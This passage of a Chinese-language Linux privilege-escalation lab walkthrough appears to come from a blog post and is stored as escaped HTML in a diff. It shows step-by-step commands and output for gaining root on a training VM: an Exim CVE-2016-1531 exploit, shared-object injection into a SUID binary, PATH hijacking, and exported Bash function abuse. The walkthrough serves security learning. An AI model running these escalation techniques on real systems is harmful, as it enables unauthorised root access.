+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;60208&lt;/span&gt; Feb &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; /usr/bin/gpasswd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;39856&lt;/span&gt; Feb &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; /usr/bin/chfn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-sr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root tty &lt;span style=&#34;color:#ae81ff&#34;&gt;12000&lt;/span&gt; Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; /usr/bin/wall
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-sr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root staff &lt;span style=&#34;color:#ae81ff&#34;&gt;9861&lt;/span&gt; May &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2017&lt;/span&gt; /usr/local/bin/suid-so
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-sr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root staff &lt;span style=&#34;color:#ae81ff&#34;&gt;6883&lt;/span&gt; May &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2017&lt;/span&gt; /usr/local/bin/suid-env
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-sr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root staff &lt;span style=&#34;color:#ae81ff&#34;&gt;6899&lt;/span&gt; May &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2017&lt;/span&gt; /usr/local/bin/suid-env2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;963691&lt;/span&gt; May &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2017&lt;/span&gt; /usr/sbin/exim-4.84-3
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;6776&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2010&lt;/span&gt; /usr/lib/eject/dmcrypt-get-device
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;212128&lt;/span&gt; Apr  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2014&lt;/span&gt; /usr/lib/openssh/ssh-keysign
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;10592&lt;/span&gt; Feb &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt; /usr/lib/pt_chown
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;36640&lt;/span&gt; Oct &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2010&lt;/span&gt; /bin/ping6
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;34248&lt;/span&gt; Oct &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2010&lt;/span&gt; /bin/ping
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;78616&lt;/span&gt; Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; /bin/mount
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;34024&lt;/span&gt; Feb &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; /bin/su
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;53648&lt;/span&gt; Jan &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; /bin/umount
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-sr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;926536&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; 09:44 /tmp/rootbash
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-sr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root shadow &lt;span style=&#34;color:#ae81ff&#34;&gt;31864&lt;/span&gt; Oct &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2011&lt;/span&gt; /sbin/unix_chkpwd
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwsr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;94992&lt;/span&gt; Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2014&lt;/span&gt; /sbin/mount.nfs
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3，在结果中，我们可用利用google、github、exploit.db找寻到利用方式&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; CVE-2016-1531 local root exploit
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sh-4.1# 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sh-4.1# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;suid--sgid-可执行文件---共享对象注入&#34;&gt;SUID / SGID 可执行文件 - 共享对象注入&lt;/h2&gt;
+&lt;p&gt;/usr/local/bin/suid-so SUID 可执行文件容易受到共享对象注入的攻击&lt;/p&gt;
+&lt;p&gt;首先我们执行&lt;code&gt;usr/local/bin/suid-so&lt;/code&gt;​前它在退出前显示一个进度条&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ /usr/local/bin/suid-so
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Calculating something, please wait...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[=====================================================================&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; %
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Done.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在文件上运行strace并在输出中搜索打开/访问调用和“没有这样的文件”错误：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ strace /usr/local/bin/suid-so 2&amp;gt;&amp;amp;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; | grep -iE &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;open|access|no such file&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;access&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/etc/suid-debug&amp;#34;&lt;/span&gt;, F_OK&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;         &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; -1 ENOENT &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;No such file or directory&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;access&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/etc/ld.so.nohwcap&amp;#34;&lt;/span&gt;, F_OK&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; -1 ENOENT &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;No such file or directory&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;access&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/etc/ld.so.preload&amp;#34;&lt;/span&gt;, R_OK&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; -1 ENOENT &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;No such file or directory&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;open&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/etc/ld.so.cache&amp;#34;&lt;/span&gt;, O_RDONLY&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;access&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/etc/ld.so.nohwcap&amp;#34;&lt;/span&gt;, F_OK&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; -1 ENOENT &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;No such file or directory&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;open&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/lib/libdl.so.2&amp;#34;&lt;/span&gt;, O_RDONLY&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;access&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/etc/ld.so.nohwcap&amp;#34;&lt;/span&gt;, F_OK&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; -1 ENOENT &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;No such file or directory&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;open&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/lib/libstdc++.so.6&amp;#34;&lt;/span&gt;, O_RDONLY&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;access&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/etc/ld.so.nohwcap&amp;#34;&lt;/span&gt;, F_OK&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; -1 ENOENT &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;No such file or directory&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;open&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/lib/libm.so.6&amp;#34;&lt;/span&gt;, O_RDONLY&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;access&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/etc/ld.so.nohwcap&amp;#34;&lt;/span&gt;, F_OK&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; -1 ENOENT &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;No such file or directory&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;open&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/lib/libgcc_s.so.1&amp;#34;&lt;/span&gt;, O_RDONLY&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;access&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/etc/ld.so.nohwcap&amp;#34;&lt;/span&gt;, F_OK&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; -1 ENOENT &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;No such file or directory&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;open&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/lib/libc.so.6&amp;#34;&lt;/span&gt;, O_RDONLY&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;open&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/user/.config/libcalc.so&amp;#34;&lt;/span&gt;, O_RDONLY&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; -1 ENOENT &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;No such file or directory&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可执行文件试图在我们的主目录中加载/home/user/.config/libcalc.so共享对象，但找不到。&lt;/p&gt;
+&lt;p&gt;为 libcalc.so 文件创建.config目录：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;mkdir /home/user/.config&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;可以在**/home/user/tools/suid/libcalc.c&lt;strong&gt;中找到示例共享对象代码。它只是生成一个 Bash shell。将代码编译到&lt;/strong&gt;suid-so**可执行文件查找它的位置的共享对象中：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;再次执行&lt;strong&gt;suid-so&lt;/strong&gt;可执行文件，注意这次我们得到的不是进度条，而是 root shell。&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;/usr/local/bin/suid-so&lt;/code&gt;​&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ mkdir /home/user/.config
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ /usr/local/bin/suid-so
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Calculating something, please wait...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bash-4.1# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;suid--sgid-可执行文件---环境变量&#34;&gt;SUID / SGID 可执行文件 - 环境变量&lt;/h2&gt;
+&lt;p&gt;/&lt;strong&gt;usr/local/bin/suid-env&lt;/strong&gt;可执行文件可以被利用，因为它继承了用户的 PATH 环境变量并尝试在不指定绝对路径的情况下执行程序。&lt;/p&gt;
+&lt;p&gt;首先，执行文件并注意它似乎在尝试启动 apache2 网络服务器：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;/usr/local/bin/suid-env&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;在文件上运行字符串以查找可打印字符的字符串：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;strings /usr/local/bin/suid-env&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;一行（“service apache2 start”）表明正在调用服务可执行文件以启动网络服务器，但是未使用可执行文件的完整路径（/usr/sbin/service）。&lt;/p&gt;
+&lt;p&gt;将位于 /home/user/tools/suid/service.c的代码编译成名为service的可执行文件。此代码只是生成一个 Bash shell：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;gcc -o service /home/user/tools/suid/service.c&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;将当前目录（或新服务可执行文件所在的位置）添加到 PATH 变量，并运行 suid-env 可执行文件以获得根 shell：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;PATH=.:$PATH /usr/local/bin/suid-env&lt;/code&gt;​&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ strings /usr/local/bin/suid-env
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/lib64/ld-linux-x86-64.so.2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;5q;Xq
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__gmon_start__
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libc.so.6
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;setresgid
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;setresuid
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;system
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__libc_start_main
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GLIBC_2.2.5
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fff.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fffff.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;l$ L
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;t&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;L
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|$0H
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;service apache2 start
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ gcc -o service /home/user/tools/suid/service.c
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@debian:~$ PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;.:$PATH /usr/local/bin/suid-env
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@debian:~# whoami
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;suidsgid-可执行文件滥用-shell-特性1&#34;&gt;SUID/SGID 可执行文件——滥用 Shell 特性（#1）&lt;/h2&gt;
+&lt;p&gt;/usr/local/bin/suid-env2 可执行文件与 /usr/local/bin/suid-env 相同，只是它 使用服务可执行文件 ( /usr/sbin/service) 的绝对路径来启动 apache2 网络服务器。&lt;/p&gt;
+&lt;p&gt;用字符串验证这一点：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;strings /usr/local/bin/suid-env2&amp;lt;br/&amp;gt;&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;在 Bash 版本 &amp;lt;4.2-048中，可以使用类似于文件路径的名称定义 shell 函数，然后导出这些函数，以便使用它们而不是该文件路径中的任何实际可执行文件。&lt;/p&gt;
+&lt;p&gt;验证安装在 Debian VM 上的 Bash 版本是否低于 4.2-048：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;/bin/bash --version&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;创建一个名为“ /usr/sbin/service ”的 Bash 函数，它执行一个新的 Bash shell（使用 -p 以保留权限）并导出该函数：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;function /usr/sbin/service { /bin/bash -p; }&amp;lt;br/&amp;gt;export -f /usr/sbin/service&lt;/code&gt;​&lt;/p&gt;
+&lt;p&gt;运行suid-env2可执行文件以获得 root shell：&lt;/p&gt;
+&lt;p&gt;​&lt;code&gt;/usr/local/bin/suid-env2&lt;/code&gt;​&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@debian:~# strings /usr/local/bin/suid-env2
